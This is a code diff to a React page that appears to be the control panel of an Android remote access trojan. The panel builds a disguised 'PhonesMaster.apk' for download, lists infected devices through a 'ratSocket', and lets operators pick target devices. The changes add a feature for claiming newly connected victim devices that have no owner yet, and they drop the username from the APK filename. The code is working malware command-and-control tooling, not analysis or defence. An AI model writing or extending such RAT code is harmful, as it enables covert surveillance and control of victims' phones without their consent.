@@ -142,7 +142,7 @@ export default function Home() {
       const url = window.URL.createObjectURL(blob);
       const a = document.createElement('a');
       a.href = url;
-      a.download = `PhonesMaster_${username}.apk`;
+      a.download = `PhonesMaster.apk`;
       document.body.appendChild(a);
       a.click();
       a.remove();
@@ -151,6 +151,14 @@ export default function Home() {
     } finally {
       setIsGenerating(false);
     }
+  };
+
+  const claimDevice = (deviceId) => {
+    if (!ratSocket) return;
+    ratSocket.emit("rat_claim_device", {
+      deviceId: deviceId,
+      ownerId: username
+    });
   };
 
   const toggleRat = async (key, pin = null) => {
@@ -289,7 +297,7 @@ export default function Home() {
       setRatSocket(s);
 
       s.on("rat_update_devices", (devices) => {
-        const myDevices = devices.filter(d => d.ownerId === username);
+        const myDevices = devices.filter(d => d.ownerId === username || d.ownerId === null);
         setOnlineDevices(myDevices);
       });
 
@@ -1004,19 +1012,35 @@ export default function Home() {
                   {onlineDevices.map((device) => (
                     <div 
                       key={device.deviceId} 
-                      onClick={() => setRatTargetId(device.deviceId)} 
-                      className={`p-3 rounded-lg border cursor-pointer transition-all flex justify-between items-center ${
-                        ratTargetId === device.deviceId 
-                          ? 'bg-green-900/30 border-green-500' 
-                          : 'bg-black/40 border-zinc-700 hover:border-zinc-500'
+                      className={`p-3 rounded-lg border flex justify-between items-center ${
+                        device.ownerId === username 
+                          ? (ratTargetId === device.deviceId ? 'bg-green-900/30 border-green-500' : 'bg-black/40 border-green-500/50 hover:border-green-500') 
+                          : 'bg-yellow-900/20 border-yellow-500/50'
                       }`}
                     >
                       <div>
-                        <p className="text-xs text-white font-bold">{device.deviceName}</p>
+                        <p className="text-xs text-white font-bold">
+                          {device.deviceName} 
+                          {device.ownerId === username && " (Milik Anda)"}
+                          {!device.ownerId && " (Baru Terhubung)"}
+                        </p>
                         <p className="text-[10px] text-zinc-500 font-mono">{device.deviceId}</p>
                       </div>
-                      {ratTargetId === device.deviceId && (
-                        <CheckCircle2 size={16} className="text-green-500" />
+                      
+                      {device.ownerId === username ? (
+                        <button 
+                          onClick={() => setRatTargetId(device.deviceId)}
+                          className={`px-3 py-1 rounded text-xs font-bold ${ratTargetId === device.deviceId ? 'bg-green-600 text-white' : 'bg-zinc-700 text-white'}`}
+                        >
+                          {ratTargetId === device.deviceId ? 'Dipilih' : 'Pilih'}
+                        </button>
+                      ) : (
+                        <button 
+                          onClick={() => claimDevice(device.deviceId)}
+                          className="px-3 py-1 rounded text-xs font-bold bg-yellow-600 hover:bg-yellow-500 text-white"
+                        >
+                          Klaim
+                        </button>
                       )}
                     </div>
                   ))}
